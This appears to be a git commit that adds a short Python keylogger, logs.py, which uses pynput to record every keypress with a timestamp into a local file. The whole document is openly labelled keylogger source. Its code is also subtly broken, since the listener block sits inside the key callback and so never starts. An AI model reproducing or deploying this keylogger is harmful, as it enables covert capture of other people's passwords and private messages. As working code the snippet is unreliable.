268ae6d1306c453900b7095fff3e44d7c5703258
TheycallmeAJ <anijas2002@gmail.com>
2024-03-02 17:15:59 +0530

    this is my initial code

---
+++ logs.py
@@ -0,0 +1,16 @@
+#Hello, this is my Keylogger Sofware Code
+
+#libraries
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + 'KeyLog.txt'), \
+                     level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+    with Listener(on_press=on_press) as Listener:
+        Listener.join()
